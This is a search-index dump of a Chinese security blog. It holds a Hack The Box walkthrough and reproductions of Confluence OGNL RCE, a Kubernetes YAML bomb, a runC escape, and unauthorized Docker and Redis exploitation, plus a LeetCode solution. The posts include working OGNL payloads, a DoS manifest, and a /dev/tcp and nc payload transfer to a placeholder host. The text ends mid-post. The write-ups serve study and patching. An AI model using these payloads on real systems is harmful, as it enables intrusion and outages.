{"meta":{"title":"lalalashenle's Blog","subtitle":"学习分享","description":"网安学习ing","author":"lalalashenle","url":"https://lalalashenle.github.io","root":"/"},"pages":[{"title":"About me","date":"2023-06-09T08:03:19.214Z","updated":"2023-06-09T08:03:19.214Z","comments":false,"path":"about/index.html","permalink":"https://lalalashenle.github.io/about/index.html","excerpt":"","text":"Tecnical Skills About Sec: 1Rich experience in actual combat attack and defense, familiar with the internal and external network penetration testing process and methods, familiar with the actual use of mainstream penetration software; About Developed:"},{"title":"标签","date":"2023-06-07T08:09:22.369Z","updated":"2022-06-17T17:04:11.909Z","comments":false,"path":"tags/index.html","permalink":"https://lalalashenle.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-06-07T08:09:22.369Z","updated":"2022-06-17T17:04:11.907Z","comments":false,"path":"categories/index.html","permalink":"https://lalalashenle.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"漏洞靶场-EscapeTwo","slug":"漏洞靶场-EscapeTwo","date":"2025-02-27T01:09:25.000Z","updated":"2025-02-28T11:51:00.711Z","comments":true,"path":"2025/02/27/漏洞靶场-EscapeTwo/","link":"","permalink":"https://lalalashenle.github.io/2025/02/27/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA-EscapeTwo/","excerpt":"摘要：靶场有两关，第一关需要通过信息搜集获取关键用户的口令，第二关则需在域内寻找关键权限漏洞，实现证书模板替换（ES4）攻击，总体难度适中。","text":"摘要：靶场有两关，第一关需要通过信息搜集获取关键用户的口令，第二关则需在域内寻找关键权限漏洞，实现证书模板替换（ES4）攻击，总体难度适中。 靶场链接：Hack The Box :: EscapeTwo 靶场提供了一个跳板用户的账号口令，以这个账户为切入点寻找突破口。 nmap扫一轮看看服务开放情况： 1nmap -sV -T4 10.10.11.51 1433端口开放，MSSQL服务可能有利用价值，需留意。同时445端口开放，靶场提供了rose账户口令，smb搜集一轮信息。留意到 sql_svc 、ca_svc 用户，分别可能在mssql漏洞打点、ADCS提权方面有利用价值。 另一方面，有一个非默认共享 Accounting Department 有可读权限，可以看一看里面有啥东西 两个表格，打开后可以拿到一些用户名和对应口令。 其中有一段口令 sa/MSSQLP@ssw0rd! 在暗示与MSSQL有关，根据指引尝试访问MSSQL，发现给的是管理员权限。 到目前为止域用户中已经有3个账户拿到权限或口令了，重点可能关注剩下几个账户。 MSSQL命令执行，查看SQL配置文件可以找到一个未发现的新口令。 使用该口令对其他几个域用户尝试密码喷洒，爆破到了 ryan 账户的口令。 winrm登录 ryan 账户，查看user.txt，第一关flag到手~ bloodhound查看域拓扑，能够发现 ryan 账户对 ca_svc 账户有 WriteOwner 权限，利用该权限ryan账户可修改ca_svc账户的所有者，从而获取WriteDACL权限，然后可以修改密码或修改证书模板。 使用 owneredit、dacledit 修改ca_svc账户owner并获取WriteDACL权限： 通过certipy获取ca_svc账户的影子凭证： 这里边有两个问题需要注意：1）EscapeTwo靶场的刷新频率比较高，所以修改owner、WriteDACL和获取影子凭证这几个动作之间不能间隔太久；2）获取权限前可能需要同步下时钟； 接下来尝试找到可利用的证书模板，certipy find 扫出来CA为 sequel-DC01-CA ，可利用 DunderMifflinAuthentication 模板，构造了ES4利用条件。 修改证书模板权限，并申请证书， 获取administrator账户凭证，winrm登录后即可拿到flag。","categories":[{"name":"HTB靶场","slug":"HTB靶场","permalink":"https://lalalashenle.github.io/categories/HTB%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"MSSQL","slug":"MSSQL","permalink":"https://lalalashenle.github.io/tags/MSSQL/"},{"name":"ADCS提权","slug":"ADCS提权","permalink":"https://lalalashenle.github.io/tags/ADCS%E6%8F%90%E6%9D%83/"}]},{"title":"知识交流-关于SSRF攻击中的DNS重绑定","slug":"知识交流-关于SSRF攻击中的DNS重绑定","date":"2023-06-09T06:55:56.000Z","updated":"2023-08-28T10:03:16.834Z","comments":true,"path":"2023/06/09/知识交流-关于SSRF攻击中的DNS重绑定/","link":"","permalink":"https://lalalashenle.github.io/2023/06/09/%E7%9F%A5%E8%AF%86%E4%BA%A4%E6%B5%81-%E5%85%B3%E4%BA%8ESSRF%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84DNS%E9%87%8D%E7%BB%91%E5%AE%9A/","excerpt":"SSRF差不多算是面试必问题了，回忆整个秋招，有印象的面试里问了四次，最开始被问懵，查阅资料后，发现是个很有意思的玩意儿，整理了秋招那会儿查阅资料时吸收消化的知识点和心得感悟，分享在此。","text":"SSRF差不多算是面试必问题了，回忆整个秋招，有印象的面试里问了四次，最开始被问懵，查阅资料后，发现是个很有意思的玩意儿，整理了秋招那会儿查阅资料时吸收消化的知识点和心得感悟，分享在此。 要理解DNS重绑定，个人觉得一个不错的角度是分别从攻与防的角度逐级解构SSRF。 关于SSRF漏洞的概念，简单概括可以理解为”攻击者假冒内网身份获取内网资源”。开发网站时常常会有在某处输入网址的需求，例如显示一个第三方图床中的图片，或者如下图所示显示一个百度页面。 1还是弄个图床的案例比较好","categories":[{"name":"知识交流","slug":"知识交流","permalink":"https://lalalashenle.github.io/categories/%E7%9F%A5%E8%AF%86%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://lalalashenle.github.io/tags/ssrf/"},{"name":"DNS重绑定","slug":"DNS重绑定","permalink":"https://lalalashenle.github.io/tags/DNS%E9%87%8D%E7%BB%91%E5%AE%9A/"}]},{"title":"漏洞分析-CVE-2022-26134: Confluence OGNL注入漏洞","slug":"漏洞分析-CVE-2022-26134-Confluence-OGNL注入漏洞","date":"2022-06-17T16:49:42.000Z","updated":"2022-06-18T07:26:01.788Z","comments":true,"path":"2022/06/18/漏洞分析-CVE-2022-26134-Confluence-OGNL注入漏洞/","link":"","permalink":"https://lalalashenle.github.io/2022/06/18/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2022-26134-Confluence-OGNL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"摘要：Java OGNL表达式代码注入导致用户可以在未经登录验证的情况下远程执行任意代码","text":"摘要：Java OGNL表达式代码注入导致用户可以在未经登录验证的情况下远程执行任意代码 Github POC Script12345678# POC:GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: localhost# 解码后$&#123;(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125;# 可以看到 payload &quot;id&quot; 回显在X-Cmd-Response header中 123456789README:利用影响Atlassian Confluence 7.18及更低版本产品的远程代码执行漏洞的POC。OGNL注入漏洞允许未经身份验证的用户在Confluence Server或Data Center实例上执行任意代码。versions after 1.3.0 and bellow 7.18.1 are affected.python3 cve-2022-26134.py https://target.com CMDpython3 cve-2022-26134.py https://target.com idpython3 cve-2022-26134.py https://target.com &quot;ps aux&quot; Ongl表达式注入12345java的表达式没有被转义, 可以执行出结果, 例如:http://6.6.6.6/login.do?message=66*66*66-66666 # 回显 220830利用 $&#123;code&#125; 则可以执行复杂代码$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())&#125; 漏洞环境搭建vulhub的docker镜像： 1234567891011121314151617docker-compose.ymldocker-compose up -dversion: &#x27;2&#x27;services: web: image: vulhub/confluence:7.13.6 ports: - &quot;8090:8090&quot; - &quot;5050:5050&quot; // 5050端口远程调试用 depends_on: - db db: image: postgres:12.8-alpine environment: - POSTGRES_PASSWORD=postgres - POSTGRES_DB=confluence 也可以下载源码进行远程调试 1234567# 源码下载:curl -O https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-7.13.6.tar.gz# 远程调试CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:your_debug_port $&#123;CATALINA_OPTS&#125;&quot;# 参考: https://www.youncyb.cn/?p=717 漏洞起因分析这是一个OGNL表达式注入漏洞，利用方式是通过URI或者HTTP发起请求注入payload，类似如下方式 12345# 实际利用payload时需要url编码curl -v http://121.5.0.0:8090/$&#123;@java.lang.Runtime@getRuntime().exec(&quot;echo hello_world&quot;.getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125;/# confluence conf_access_log.log 日志中会做如下记录[01/Jun/2022:16:02:13 -0700] - http-nio-8090-exec-10 121.5.0.0 GET /$&#123;@java.lang.Runtime@getRuntime().exec(&quot;echo hello_world&quot;)&#125;/ HTTP/1.1 302 20ms - - curl/7.68.0 从payload中能看出该漏洞保存exec调用执行的输出结果，并使用setHeader方法将结果回显在服务器对攻击者的响应header中。 1.exec(....).getResponse -&gt; setHeader(...)回显 究其根本原因，可以看到OGNL的注入，其堆栈调用链分别经过了 HttpServlet.service 一直到 OgnlValueStack.findValue ，再进而执行其他。 1234567891011at ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:171)at ognl.SimpleNode.getValue(SimpleNode.java:193)at ognl.Ognl.getValue(Ognl.java:333)at ognl.Ognl.getValue(Ognl.java:310)at com.opensymphony.xwork.util.OgnlValueStack.findValue(OgnlValueStack.java:141)at com.opensymphony.xwork.util.TextParseUtil.translateVariables(TextParseUtil.java:39)at com.opensymphony.xwork.ActionChainResult.execute(ActionChainResult.java:95)..................at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) findValue 是执行OGNL注入的关键，由该方法传输表达式，进而被执行。这个方法是由TextParseUtil.class 进行调用的。 12345678public class TextParseUtil &#123; public static String translateVariables(String expression, OgnlValueStack stack) &#123; ........ // OgnlValueStack.findValue Object o = stack.findValue(g); ........ &#125;&#125; ActionInvocation.class 中调用 TextParseUtil.translateVariables() 方法，并且通过 “this.namespace” 传输注入的表达式。 123456public void execute(ActionInvocation invocation) throws Exception &#123; if (this.namespace == null) this.namespace = invocation.getProxy().getNamespace(); OgnlValueStack stack = ActionContext.getContext().getValueStack(); String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack); String finalActionName = TextParseUtil.translateVariables(this.actionName, stack); 而 “this.namespace” 则是在 Webwork 的 getNamespaceFromServletPath 中进行调用的。（从这儿会发现编写payload时必须以”/“结尾，不然找不到索引编号） 1234public static String getNamespaceFromServletPath(String servletPath) &#123; servletPath = servletPath.substring(0, servletPath.lastIndexOf(&quot;/&quot;)); return servletPath;&#125; 整理一遍，该漏洞的产生原因就是攻击者输入的URI被转换为 namespace，然后 namespace 作为OGNL表达式被执行。 1234攻击者构造payload -&gt; Webwork工具传输攻击者的uri -&gt; uri作为namespace变量进入ActionInvocation类 -&gt; TextParseUtil类中生成了ONGL的注入表达式 -&gt; 后续堆栈执行表达式这个漏洞和Struts2这个很像, 也是namespace解析后被作为ONGL表达式执行了# https://blog.csdn.net/u013224189/article/details/81091874 从该条调用链中，可以发现漏洞实现的重点是在 ActionInvocation 类中，后边6月3号Atlassian官方发布的补丁也是在这个类里做改动，补丁中修改 ActionInvocation 类使得 namespace 不再传递进 TextParseUtil 类的 translateVariables 方法中。 1234567891011public void execute(ActionInvocation invocation) throws Exception &#123; if (this.namespace == null) this.namespace = invocation.getProxy().getNamespace(); // 改前: OgnlValueStack stack = ActionContext.getContext().getValueStack(); // 改前: String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack); String finalNamespace = this.namespace; // 改前: String finalActionName = TextParseUtil.translateVariables(this.actionName, stack); String finalActionName = this.actionName; 另外，补丁为了防止黑客使用绕过手段，依旧成功调用 findValue 方法，加了一个恶意表达式的过滤函数，过滤方式是通过黑名单： 12345678public Object findValue(String expr) &#123; try &#123; if (expr == null) return null; // 添加了一个safeExpressionUtil类 if (!this.safeExpressionUtil.isSafeExpression(expr)) return null; ....... 测试payload能否过滤沙箱的代码： 1234567// $&#123;true.toString().charAt(0).toChars(67)[0].toString()&#125; for(int i = 0; i &lt; node.jjtGetNumChildren(); ++i) &#123; Node childNode = node.jjtGetChild(i); if (childNode != null &amp;&amp; this.containsUnsafeExpression(childNode, visitedExpressions)) &#123; return true; &#125;&#125; 网上搜到几个可以绕过过滤沙箱的payload，小伙伴们试试看，写个poc啥的。 12345// 计算器$&#123;&quot;&quot; + Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, null).invoke(null,null).exec(&quot;gnome-calculator&quot;)&#125;&#125;// 也是计算器true.toString().charAt(0).toChars(106)[0].toString().concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(118)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(108)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(103)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(82)[0].toString()).concat(true.toString().charAt(0).toChars(117)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(116)[0].toString()).concat(true.toString().charAt(0).toChars(105)[0].toString()).concat(true.toString().charAt(0).toChars(109)[0].toString()).concat(true.toString().charAt(0).toChars(101)[0].toString()) ==参考链接：== 12345678910111. CVE-2022-26134 Confluence OGNL RCE 漏洞分析 - 安全客https://www.anquanke.com/post/id/2740262. CentOS8 docker搭建confluence7.12.4调试环境https://www.youncyb.cn/?p=7173. CVE-2022-26134: A look into bypass isSafeExpression check in Confluence Preauth RCEhttps://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html4. CVE-2022-26134 Confluence OGNL RCE 漏洞深入分析和高版本绕过沙箱实现命令回显https://mp.weixin.qq.com/s/nCMtSD7QH8ai6fpurJBXTg","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Confluence","slug":"Confluence","permalink":"https://lalalashenle.github.io/tags/Confluence/"},{"name":"OGNL表达式注入","slug":"OGNL表达式注入","permalink":"https://lalalashenle.github.io/tags/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"漏洞复现-CVE-2019-11253 YAML炸弹","slug":"漏洞复现-CVE-2019-11253-YAML炸弹","date":"2022-01-04T02:55:09.000Z","updated":"2022-06-18T07:31:38.040Z","comments":true,"path":"2022/01/04/漏洞复现-CVE-2019-11253-YAML炸弹/","link":"","permalink":"https://lalalashenle.github.io/2022/01/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-11253-YAML%E7%82%B8%E5%BC%B9/","excerpt":"摘要：Golang的yaml处理包存在解析漏洞，间接导致引用了该包的K8S在传输恶意yaml时，会造成DoS攻击","text":"摘要：Golang的yaml处理包存在解析漏洞，间接导致引用了该包的K8S在传输恶意yaml时，会造成DoS攻击 0x00 简介Kubernetes是Google开源的一个容器编排引擎，它支持自动化部署、大规模可伸缩、应用容器化管理。在Kubernetes中，我们可以创建多个容器，每个容器里面运行一个应用实例，然后通过内置的负载均衡策略，实现对这一组应用实例的管理、发现、访问，不必像在生产环境中那样，部署一个应用程序时，要部署该应用的多个实例以便对应用请求进行负载均衡。 0x01 漏洞概述Kubernetes API Server （1.16及以下的部分版本）解析JSON/YAML时容易受到DoS攻击。授权用户可以发送恶意YAML或JSON构造的payload，从而使kube-apiserver消耗过多的CPU或内存资源，可能导致服务器崩溃。（未被授权或被拒绝的请求不会触发该漏洞，这一点貌似可以利用Authenticating Proxy来绕过，利用方式为发送请求头”X-Remote-User : admin”） 0x02 影响版本1.16及以下的部分版本（1.0.0-1.12.x，1.13.0-1.13.11，1.14.0-1.14.7，1.15.0-1.15.4，1.16.0-1.16.1） 0x03 环境搭建通过Metarget开源靶场搭建，该靶场可以比较方便的管理Kubernetes组件 因为该漏洞只对K8S版本有要求，故安装对应版本的kube组件即可，本次复现选择v1.11.10版本 0x04 漏洞复现当创建包含递归引用的ConfigMap对象时，可能会出现过多的CPU占用，属于”Billion Laughs attack”XML解析问题。将此YAML文件应用到集群会导致客户端挂起一段时间，占用大量的CPU资源。 123456789101112131415apiVersion: v1data: a: &amp;a [&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;,&quot;web&quot;] b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a] c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b] d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c] e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d] f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e] g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f] h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g] i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]kind: ConfigMapmetadata: name: yaml-bomb namespace: default 在客户端中通过如下命令启动攻击： 123kubectl create -f &lt;manifest&gt;# 观察目标集群的API服务器的CPU/内存使用情况top 也可以使用curl将YAML直接POST到API服务器，从而导致kube-apiserver拒绝服务，这样可以有效绕过客户端处理。 123# 开启通向API Server的代理kubectl proxycurl -X POST http://127.0.0.1:8001/api/v1/namespaces/default/configmaps -H &quot;Content-Type: application/yaml&quot; --data-binary @cve-2019-11253-attack.yaml 注：以上手法要求攻击者有权限在默认名称空间中创建ConfigMap对象。 如图，首先准备好yaml文件 执行创建ConfigMap命令，注意yaml文件里要有”kind: ConfigMap”字段，不然”kubectl create”命令执行会报错 可以看到CPU和MEM的资源消耗急剧升高。 0x05 修复方式升级Kubernetes客户端版本 参考链接：CVE-2019-11253: Kubernetes API Server JSON/YAML parsing vulnerable to resource exhaustion attack · Issue #83253 · kubernetes/kubernetes (github.com)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"云安全","slug":"云安全","permalink":"https://lalalashenle.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://lalalashenle.github.io/tags/Kubernetes/"},{"name":"DoS攻击","slug":"DoS攻击","permalink":"https://lalalashenle.github.io/tags/DoS%E6%94%BB%E5%87%BB/"}]},{"title":"漏洞复现-CVE-2019-5736: runC容器逃逸","slug":"漏洞复现-CVE-2019-5736-runC容器逃逸","date":"2021-12-31T06:55:59.000Z","updated":"2022-06-18T07:31:35.335Z","comments":true,"path":"2021/12/31/漏洞复现-CVE-2019-5736-runC容器逃逸/","link":"","permalink":"https://lalalashenle.github.io/2021/12/31/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-5736-runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/","excerpt":"摘要：1.0-rc6版本之前的runC（体现在docker上则为版本低于18.09.2）由于文件描述符处理不当，可能导致容器root权限逃逸到主机root权限","text":"摘要：1.0-rc6版本之前的runC（体现在docker上则为版本低于18.09.2）由于文件描述符处理不当，可能导致容器root权限逃逸到主机root权限 0x00 简介runc is a CLI tool for spawning and running containers on Linux according to the OCI specification. 0x01 漏洞概述Docker、containerd或者其他基于runC的容器运行时存在安全漏洞，特定版本中的docker使用了1.0-rc6版本之前的runC，攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。这是因为文件描述符处理不当，与/proc/self/exe有关。 0x02 影响版本Docker &lt; 18.09.2，runC &lt; 1.0-rc6 0x03 环境搭建网络上有可以直接利用的POC，这里贴出本次复现中使用的，Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com) 按需求修改POC中的payload后，即可交叉编译linux执行程序准备复现。 0x04 漏洞复现直接本地挂载POC脚本所在文件夹即可 执行编译后的POC程序。当用户再次使用容器时，POC即可成功实现runC逃逸 当然我们也可以反弹一个root权限的shell 注： 本次复现中假设复现环境为”已经获取docker权限”场景。其他场景可能包括： 获取到docker remote api未授权环境，远程执行poc，可以参考漏洞复现-Docker remote api未授权 | lalalashenle’s Blog 获取到某个容器的权限后，可以尝试在公网起一个web服务后，在容器内通过curl、wget等工具下载poc执行程序 如果容器中没有wget或curl命令，可以将POC执行文件下载到公网服务器上，并执行命令监听端口nc -lvp 999 &lt; your_poc_file，在容器中执行cat &lt; /dev/tcp/your_ip/port &gt; file 本次复现中使用到的POC文件在Ubuntu 16.x环境下可能会无效，这里推荐几个其他POC，使用方法是基本相同的 q3k/cve-2019-5736-poc: Unweaponized Proof of Concept for CVE-2019-5736 (Docker escape) (github.com) pocs/CVE-2019-5736 at master · feexd/pocs (github.com) 由于POC文件会修改”/proc/self/exe”文件，所以复现完后会导致docker-runc无法使用，进一步的docker也没法用了，需要卸载重新安装:smile: 0x05 修复方式安装新版本docker即可 参考链接：docker逃逸漏洞复现（CVE-2019-5736）_GGyao的博客-CSDN博客_docker逃逸漏洞","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"docker","slug":"docker","permalink":"https://lalalashenle.github.io/tags/docker/"},{"name":"云安全","slug":"云安全","permalink":"https://lalalashenle.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"}]},{"title":"LeetCode-0825-适龄的朋友","slug":"LeetCode-0825-适龄的朋友","date":"2021-12-27T03:09:27.000Z","updated":"2022-06-18T07:32:14.548Z","comments":true,"path":"2021/12/27/LeetCode-0825-适龄的朋友/","link":"","permalink":"https://lalalashenle.github.io/2021/12/27/LeetCode-0825-%E9%80%82%E9%BE%84%E7%9A%84%E6%9C%8B%E5%8F%8B/","excerpt":"","text":"题目描述有点问题，应该是x和y之间，只要满足题目所给条件，则就会发送一条好友信息，根据题目所展示的样例[16, 16]来看，即使A已经对B发送了好友请求，如果B对A满足条件的话，仍然是会去发送请求的，故[16, 16]样例的返回结果为2。 题目所给的条件也有点问题，条件三是多余的，只需要看前两个条件就行，不难推出，在确定下标x的前提下，满足条件的y下标范围为： 1(ages[x] * 0.5 + 7, ages[x]] # 左开右闭 代码比较简单，在对下标x的遍历过程中，设置左右双指针确定范围，并累加范围数，最后返回结果即可。 代码展示： 1234567891011121314151617class Solution: def numFriendRequests(self, ages: List[int]) -&gt; int: ages.sort() len_ages = len(ages) res = 0 left = right = 0 # 范围: (ages[x] * 0.5 + 7, ages[x]] for i in range(0, len_ages): if ages[i] &lt; 15: continue while ages[left] &lt;= ages[i] * 0.5 + 7: left += 1 while (right &lt; len_ages - 1) and (ages[right + 1] &lt;= ages[i]): right += 1 res += (right - left) return res 成功通过：","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"双指针","slug":"双指针","permalink":"https://lalalashenle.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}]},{"title":"漏洞复现-Docker remote api未授权","slug":"漏洞复现-Docker-remote-api未授权","date":"2021-12-21T02:59:41.000Z","updated":"2022-06-18T07:31:40.648Z","comments":true,"path":"2021/12/21/漏洞复现-Docker-remote-api未授权/","link":"","permalink":"https://lalalashenle.github.io/2021/12/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83/","excerpt":"摘要：Docker remote api未授权漏洞会导致登录权限被窃取、fantanshell等危害，本篇文章对此漏洞做了利用复现","text":"摘要：Docker remote api未授权漏洞会导致登录权限被窃取、fantanshell等危害，本篇文章对此漏洞做了利用复现 0x00 简介Docker Remote API是一个取代远程命令行界面（rcli）的REST API。开启后可以使用curl等命令行工具来远程处理docker提供的url并获取信息，也可以通过”docker -H”来远程操作docker cli命令。相当于将原先默认以文件socket方式启动docker，改为tcp方式。 0x01 漏洞概述该未授权访问漏洞是因为docker remote api可以执行docker命令，该接口可以通过url操作docker命令。docker daemon会在docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，例如访问 http://host:2375/containers/json 就会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。进一步的，可以利用docker权限进行修改ssh密钥、反弹shell等操作。 0x02 影响版本开启remote api并且没有进行防火墙访问限制的docker服务 0x03 环境搭建开启docker remote api即可，这里提供两个参考开启方式： 修改配置文件1234567891. 编辑docker.service配置文件 vim /lib/systemd/system/docker.service2. 修改ExecStart ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock3. 重载守护进程以及重启Docker sudo systemctl daemon-reload sudo service docker restart4. 执行命令查看是否开放了远程访问端口 sudo systemctl status docker.service netstat -lntp | grep 2375 执行命令1dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375 攻击准备配置好remote api后，测试执行docker api是否正常返回结果： 1docker -H tcp://*.*.*.*:2375 images 0x04 漏洞复现挂载目录并修改ssh密钥挂载authorized_keys文件所在的/home/ubuntu目录，映射到容器的/mnt文件夹中 进入/mnt文件夹，可以看到已经成功获取到了主机文件，进入.ssh文件夹准备修改登录公钥 首先攻击机生成一个本地公钥 修改受害机登录公钥 可以看到尝试免密登陆成功 修改计划任务反弹shell获取权限挂载/etc目录，获取crontab定时任务文件 crontab中写入反弹shell任务，攻击机监听对应端口，等待shell反弹即可 0x05 修复方式 设置防火墙访问规则（若内网被渗透则仍会存在风险） 使用TLS socket， 参考官方文档：Protect the Docker daemon socket | Docker Documentation 参考链接：Docker开启Remote API 访问 2375端口 关于docker remote api未授权访问漏洞的学习与研究 Docker_remote_api未授权访问漏洞","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"docker","slug":"docker","permalink":"https://lalalashenle.github.io/tags/docker/"},{"name":"云安全","slug":"云安全","permalink":"https://lalalashenle.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"}]},{"title":"漏洞复现-Redis未授权利用","slug":"漏洞复现-Redis未授权利用","date":"2021-12-10T11:02:59.000Z","updated":"2022-06-18T07:31:47.406Z","comments":true,"path":"2021/12/10/漏洞复现-Redis未授权利用/","link":"","permalink":"https://lalalashenle.github.io/2021/12/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%A9%E7%94%A8/","excerpt":"摘要：redis若授权访问配置不当，则可能会引发敏感信息泄露、ssh免密登录、主从复制RCE等一系列风险","text":"摘要：redis若授权访问配置不当，则可能会引发敏感信息泄露、ssh免密登录、主从复制RCE等一系列风险 0x00 简介 Redis是一款开源key-value型数据库。 0x01 漏洞概述Redis提供了redis-cli命令行工具，当redis授权形式配置不当时，恶意用户可能通过redis-cli远程接入redis数据库，并进行进一步的利用。 0x02 影响版本3.2版本后redis默认开启保护模式（protected-mode），但主要还是看授权配置是否得当 0x03 环境搭建 使用vulhub开源漏洞靶场，用docker-compose起一个redis未授权环境，可以看到在攻击机上可以利用redis-cli远程接入未授权redis 事实上，当恶意用户调用”info”命令时，就已经造成了敏感信息泄露了，甚至也可以调用”flushall”清楚数据库造成重大损失。进一步的，由于redis提供了动态配置修改功能，恶意用户可以通过修改备份工作目录和备份文件，完成许多漏洞利用操作。 0x04 漏洞复现如下图，在远程连接未授权redis的攻击机上，设置dir为/data/目录，设置dbfilename为test文件，当执行save命令后（注：该命令要求受害机的未授权redis是root权限下开启的），在受害机的/data/目录下也出现了test文件，并且文件内容为攻击机上设置的key-value字段。可见修改备份工作目录和备份文件，可以看到相关修改会映射到受害服务器上。 根据这个方法，可以衍生地修改id_rsa文件实现SSH免密登录、修改crontab文件实现定时任务反弹shell、在web服务路径植入webshell文件等。 前面提到，save命令需要root权限，如果受害服务器并不是用root权限起的redis服务，则可以通过”目录爆破”方法获取到服务器目录，造成敏感信息泄露。 如上图，当config set dir的value设为一个不存在的，或者无权限访问的目录时，会出现对应的报错信息，反之则会返回OK，可以根据这个报错信息将服务器的目录进行爆破猜解。 我们可以发现以上方法都是通过写文件的方式完成风险操作，这样的方式存在不足，仔细看这张图： 可以看到除了hello 